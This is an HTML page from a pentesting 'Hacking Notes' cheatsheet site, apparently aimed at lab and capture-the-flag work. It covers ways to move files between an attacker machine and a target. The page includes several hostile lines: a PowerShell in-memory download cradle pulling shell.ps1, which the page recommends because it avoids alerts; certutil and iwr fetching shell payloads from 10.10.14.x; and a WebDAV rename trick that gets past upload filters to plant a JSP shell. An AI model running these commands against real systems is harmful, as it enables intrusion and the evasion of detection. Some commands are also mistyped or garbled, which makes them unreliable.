@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+      <link rel="shortcut icon" href="../../img/favicon.ico" />
+    <title>File Transfers 101 - Hacking Notes</title>
+    <link rel="stylesheet" href="../../css/theme.css" />
+    <link rel="stylesheet" href="../../css/theme_extra.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/styles/github.min.css" />
+    
+      <script>
+        // Current page data
+        var mkdocs_page_name = "File Transfers 101";
+        var mkdocs_page_input_path = "Cheatsheets/2022-07-30-file-transfers-101.md";
+        var mkdocs_page_url = null;
+      </script>
+    
+    <script src="../../js/jquery-3.6.0.min.js" defer></script>
+    <!--[if lt IE 9]>
+      <script src="../../js/html5shiv.min.js"></script>
+    <![endif]-->
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/languages/python.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/languages/javascript.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/languages/bash.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/languages/powershell.min.js"></script>
+      <script>hljs.initHighlightingOnLoad();</script> 
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+          <a href="../.." class="icon icon-home"> Hacking Notes
+        </a><div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+      <input type="text" name="q" placeholder="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../..">Welcome to MkDocs</a>
+                </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Cheatsheets</span></p>
+              <ul class="current">
+                  <li class="toctree-l1"><a class="reference internal" href="../101_windows/">Windows Privilege Escalation 101</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../2022-07-09-impacket/">2022 07 09 impacket</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../2022-07-10-bloodhound/">BloodHound</a>
+                  </li>
+                  <li class="toctree-l1 current"><a class="reference internal current" href="./">File Transfers 101</a>
+    <ul class="current">
+    <li class="toctree-l2"><a class="reference internal" href="#hasing-and-verifying-files">Hasing and Verifying Files</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#one-file-many-files">One file &gt; Many files</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#bash-command-line-tools">BASH (command line tools)</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#ftp">FTP</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#connect">Connect</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#log-in">Log in</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#move-around">Move around</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#grab-files">Grab files</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#send-files">Send files</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#python">Python</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#with-requests">With Requests</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#with-wget">With wget</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#with-urllib">With urllib</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#powershell">Powershell</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#standard-web-request">Standard Web Request</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#smb">SMB</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#standard-smb">Standard SMB</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#set-folder-permissions">Set folder permissions</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#restart-samba">Restart Samba</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#monitor-logs-for-errors">Monitor logs for errors</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#impacket-smb">Impacket SMB</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#impacket-smb-w-password">Impacket SMB w/ Password</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#certutil">certutil</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#tftp">TFTP</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#sftp">SFTP</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#visualbasic">VisualBasic</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#webdav">WebDAV</a>
+    </li>
+    </ul>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../2022-07-30-pivot-101/">Pivoting & Lateral Movement</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../2022-07-30-x-without-y/">X Without Y (Living off the Land)</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../2022-08-07-auth-bypass-headers/">Auth Bypass Headers"</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../2022-08-10-golden-ticket/">Golden Tickets</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../2022-10-04-pentesting-email-servers/">Email Pentesting</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../2023-01-15-101_icalcs/">ICACLs 101</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Kubernetes_Pentesting/">Pentesting Kubernetes</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Powershell_Empire/">Powershell Empire</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../cheatsheet_js/">Commands</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../hydra_cheat_sheet/">Hydra Cheat Sheet</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../linux/">Linux 101</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../msfvenom_cheatsheet/">MSFVenom Cheatsheet</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../splunk_cheat_sheet/">Splunk Cheatsheet</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Recon</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../Recon/mapping/">Application Mapping</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../Recon/recon/">Recon and Information Gathering</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Web</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../Web/web_hacking/">Web Application Hacking</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Windows</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../Windows/PowerShell/">PowerShell</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../Windows/windows_101/">Windows 101</a>
+                  </li>
+              </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../..">Hacking Notes</a>
+        
+      </nav>
+      <div class="wy-nav-content">
+        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="../.." class="icon icon-home" alt="Docs"></a> &raquo;</li>
+          <li>Cheatsheets &raquo;</li>
+      <li>File Transfers 101</li>
+    <li class="wy-breadcrumbs-aside">
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+            <div class="section" itemprop="articleBody">
+              
+                <h1 id="file-transfers-101">File Transfers 101</h1>
+<p>There is more than one way to skin a cat, and there is more than one way to transfer a file.</p>
+<p>Just because one method doesn't work, doens't mean another one won't.</p>
+<p>Try Harder™</p>
+<h2 id="hasing-and-verifying-files">Hasing and Verifying Files</h2>
+<p>Before you transfer a file, it's always best to know what it is you're actually transferring, mostly so you'll know if it gets corrupted during the transfer. But also becuse reading files in a terminal makes you feel like a proper hacker.</p>
+<pre><code class="language-bash"># Read a file
+cat /path/to/file
+
+# Read the file headers
+xxd /path/to/file | head -c 1024
+
+# Have Linux guess at the file type (from the file header)
+file /path/to/file
+
+# Get a SHA256 hash
+sha265sum /path/to/file
+
+# Get an MD5 hash
+md5sum /path/to/file
+</code></pre>
+<h2 id="one-file-many-files">One file &gt; Many files</h2>
+<p>If it's possible, archive whatever it is you need to upload/download.</p>
+<p>Sometimes it's not really feasible but it's something that should be considered, for multiple reasons.</p>
+<ul>
+<li>It's a smaller file</li>
+<li>It won't match any stored file hashes if your adversary uses such monitoring</li>
+<li>One file is easier to transfer than 10</li>
+<li>You can serialize the contents of an archive for text based extraction if that's all you have</li>
+</ul>
+<pre><code class="language-bash"># Create a new tarball
+tar czvf NameOfTarBall.tgz /path/to/archive
+
+# Extract tarball
+tar xvf NameOfTarBall.tgz
+
+# Serialize a tarball
+cat NameOfTarBall.tgz | base64 -w 0
+
+# Recover tarball from serialized data
+echo &quot;&lt;BASE64_STRING&gt;&quot; | base64 -d &gt; recovered.tgz
+</code></pre>
+<h2 id="bash-command-line-tools">BASH (command line tools)</h2>
+<pre><code class="language-bash">wget &lt;path to file&gt; -O &lt;filename&gt;
+curl &lt;path to file&gt; --output &lt;filename&gt;
+
+# Copy a file from a target to our host
+scp user@host:/path/to/file /path/to/destination
+
+# Copy a file from our host to a target
+scp /path/to/file user@host:/path/to/destination
+
+# Copy a whole directory from our host to a target
+scp -r /path/to/directory user@host:/path/to/destination
+
+</code></pre>
+<p>We can use a netcat listener and STDOUT to write raw input to files:</p>
+<pre><code class="language-bash"># setup a listener where &quot;someFile&quot; is the file you want to write
+# this will sit and wait for the connection, so set it up first
+nc -lvnp 1337 &gt; someFile
+
+# On the target
+nc 10.10.14.4 1337 &lt; someFile
+</code></pre>
+<p>You'll have no real way to tell when the transfer is done using the above <code>nc</code> method, so don't hit Ctrl-C until you're sure that everything copied across, and be sure to check the file size and run <code>file</code> and/or <code>sha256sum</code> to verify the integrity of the file (it can get trashed using this method)</p>
+<h2 id="ftp">FTP</h2>
+<h3 id="connect">Connect</h3>
+<pre><code class="language-bash">ftp domain.com
+ftp 192.168.0.1
+ftp user@ftpdomain.com
+</code></pre>
+<h3 id="log-in">Log in</h3>
+<pre><code class="language-bash">Name: anonymous
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt;
+</code></pre>
+<h3 id="move-around">Move around</h3>
+<pre><code class="language-bash">ftp&gt; ls
+ftp&gt; cd directory
+</code></pre>
+<h3 id="grab-files">Grab files</h3>
+<pre><code class="language-bash">get file
+</code></pre>
+<h3 id="send-files">Send files</h3>
+<pre><code class="language-bash">put file
+</code></pre>
+<h2 id="python">Python</h2>
+<h3 id="with-requests">With Requests</h3>
+<p><code>pip install requests</code></p>
+<pre><code class="language-python">import requests
+
+url = 'https://www.python.org/static/img/python-logo@2x.png'
+myfile = requests.get(url)
+open('/path/to/save/image.png', 'wb').write(myfile.content)
+</code></pre>
+<h3 id="with-wget">With wget</h3>
+<p><code>pip install wget</code></p>
+<pre><code class="language-python">import wget
+
+url = &quot;https://www.python.org/static/img/python-logo@2x.png&quot;
+wget.download(url, '/path/to/save/image.png')
+</code></pre>
+<h3 id="with-urllib">With urllib</h3>
+<p><em>should already be installed, but...</em> <code>pip install urllib</code></p>
+<pre><code class="language-python">urllib.request.urlretrieve('url', 'path')
+</code></pre>
+<p>With urllib3</p>
+<p><code>pip install urllib3</code></p>
+<pre><code class="language-python">import urllib3, shutil
+
+url = 'https://www.python.org/'
+c = urllib3.PoolManager()
+filename = &quot;test.txt&quot;
+with c.request('GET', url, preload_content=False) as res, open(filename, 'wb') as out_file:
+    shutil.copyfileobj(res, out_file)
+</code></pre>
+<h2 id="powershell">Powershell</h2>
+<p>In-memory download cradle <em>handy for pentesting as nothing gets written to disk so there is less chance of triggering a related alert</em></p>
+<pre><code class="language-bash">IEX(New-Object Net.WebClient)downloadString('http://10.10.14.4/shell.ps1')
+</code></pre>
+<h3 id="standard-web-request">Standard Web Request</h3>
+<pre><code class="language-bash">iwr ‘http://10.10.14.4/shell.ps1’ -Outfile C:\Windows\temp\shell.ps1
+
+Invoke-WebRequest -Url http://10.10.14.4/shell.ps1 -Outfile C:\Windows\temp\shell.ps1
+</code></pre>
+<h2 id="smb">SMB</h2>
+<h3 id="standard-smb">Standard SMB</h3>
+<ol>
+<li>Modify /etc/samba/smbd.conf. Add the following to the bottom:</li>
+</ol>
+<pre><code class="language-bash">[global]
+workgroup = WORKGROUP
+server string = Samba Server %v
+netbios name = tengu
+security = user
+map to guest = bad user
+name resolve order = bcast host
+dns proxy = no
+bind interfaces only = yes
+
+[gorilla]
+path = /var/www/html/pub
+writable = no
+guest ok = yes
+guest only = yes
+read only = yes
+directory mode = 0555
+force user = nobody
+</code></pre>
+<h3 id="set-folder-permissions">Set folder permissions</h3>
+<pre><code class="language-bash">chmod 0555 /var/www/html/pub
+chown -R nobody:nogroup /var/www/html/pub
+
+</code></pre>
+<h3 id="restart-samba">Restart Samba</h3>
+<pre><code class="language-bash">service smbd start
+service smdb stop
+service smbd restart
+
+</code></pre>
+<h3 id="monitor-logs-for-errors">Monitor logs for errors</h3>
+<pre><code class="language-bash">tail -f /var/log/samba/log.&lt;site-name&gt;
+</code></pre>
+<h2 id="impacket-smb">Impacket SMB</h2>
+<pre><code class="language-bash">impacket-smbserver -ip 10.10.14.4 -smb2support bullsec /var/www/html/pub
+</code></pre>
+<p>Then use <code>\\10.10.14.4\bullsec\&lt;file-name&gt;</code> as the location to send your file from, or to have the target grab from you.</p>
+<p>Mounting a remote share is pretty simple as well assuming you know the name of the share:</p>
+<pre><code class="language-bash">mkdir /mnt/10.10.10.123
+mount -t cifs //10.10.10.123/general /mnt/10.10.10.123
+
+</code></pre>
+<p>Now we can browse the share inside our terminal.</p>
+<h3 id="impacket-smb-w-password">Impacket SMB w/ Password</h3>
+<pre><code class="language-bash"># Create the SMB Share
+impacket-smbserver bullShare $(pwd) -smb2support -user bullsec -password SecurePassword
+</code></pre>
+<pre><code class="language-powershell"># Create a Credential Object
+$pass = convertto-securestring 'SecurePassword' -asplain -force
+$cred = new-object system.management.automation.pscredential(&quot;htb\bullsec&quot;, $pass)
+</code></pre>
+<pre><code class="language-powershell"># Connect to the Share
+New-PSDrive -Name bullsec -PSProvider FileSystem -Credential $cred -Root \\10.10.14.3\bullShare
+</code></pre>
+<pre><code class="language-powershell"># Browse the Share
+cd bullShare:
+</code></pre>
+<h2 id="certutil">certutil</h2>
+<p>Genuinely forget that this is a thing most of the time but it's such a useful tool. If you're on a Windows machine then this may be a viable option for transferring files from our host system to the target:</p>
+<pre><code class="language-bash">certutil -urlcache -f “http://10.10.14.14/shell.exe” shell.exe
+</code></pre>
+<p>That's it really.</p>
+<p>It might not always be a thing, but on older Windows machines it should be present.</p>
+<h2 id="tftp">TFTP</h2>
+<p>Trivial File Transfer Protocol is a nice way to get around file transfers on Windows assuming it's installed on the sytem. It's basically FTP but it runs on UDP instead of TCP.</p>
+<pre><code class="language-bash">service atftpd start
+</code></pre>
+<p>On Kali by default TFTP is configured from the following location:</p>
+<p><code>/etc/default/atftpd</code></p>
+<p>And it serves files (by default) from:</p>
+<p><code>/srv/tftp</code></p>
+<p>To download files from a server we can do:</p>
+<pre><code class="language-bash">tftp -i host GET C:%homepath%file location_of_file_on_tftp_server
+</code></pre>
+<p>And to upload a file to the server we can do:</p>
+<pre><code class="language-bash">tftp -i host PUT C:%homepath%file location_of_file_on_tftp_server
+</code></pre>
+<h2 id="sftp">SFTP</h2>
+<p><a href="https://www.digitalocean.com/community/tutorials/how-to-use-sftp-to-securely-transfer-files-with-a-remote-server">How To Use SFTP to Securely Transfer Files with a Remote Server</a></p>
+<h2 id="visualbasic">VisualBasic</h2>
+<p>If push comes to shove, we can use something like the following:</p>
+<pre><code class="language-bash">Set args = Wscript.Arguments 
+Url = &quot;http://domain/file&quot; dim xHttp: 
+Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;) dim bStrm: 
+Set bStrm = createobject(&quot;Adodb.Stream&quot;) 
+xHttp.Open &quot;GET&quot;, Url, False xHttp.Send with bStrm     
+.type = 1 '     
+.open     
+.write xHttp.responseBody     
+.savetofile &quot; C:%homepath%file&quot;, 2 ' end with
+</code></pre>
+<h2 id="webdav">WebDAV</h2>
+<p>We can sometimes use WebDAV to upload files to a system.</p>
+<p>If it's enabled use a tool like cadaver to PUT a file onto the server, usually there are some restrictions on file uploads/execution, bu it doesn't recheck the file after the initial upload, so just use the mv command to change the extension.</p>
+<pre><code class="language-bash">$&gt; cadaver http://192.168.56.5
+
+put shell.jsp.txt
+mv shell.jsp.txt shell.jsp
+</code></pre>
+              
+            </div>
+          </div><footer>
+    <div class="rst-footer-buttons" role="navigation" aria-label="Footer Navigation">
+        <a href="../2022-07-10-bloodhound/" class="btn btn-neutral float-left" title="BloodHound"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+        <a href="../2022-07-30-pivot-101/" class="btn btn-neutral float-right" title="Pivoting & Lateral Movement">Next <span class="icon icon-circle-arrow-right"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+          
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="Versions">
+  <span class="rst-current-version" data-toggle="rst-current-version">
+    
+    
+      <span><a href="../2022-07-10-bloodhound/" style="color: #fcfcfc">&laquo; Previous</a></span>
+    
+    
+      <span><a href="../2022-07-30-pivot-101/" style="color: #fcfcfc">Next &raquo;</a></span>
+    
+  </span>
+</div>
+    <script>var base_url = '../..';</script>
+    <script src="../../js/theme_extra.js" defer></script>
+    <script src="../../js/theme.js" defer></script>
+      <script src="../../search/main.js" defer></script>
+    <script defer>
+        window.onload = function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        };
+    </script>
+
+</body>
+</html>
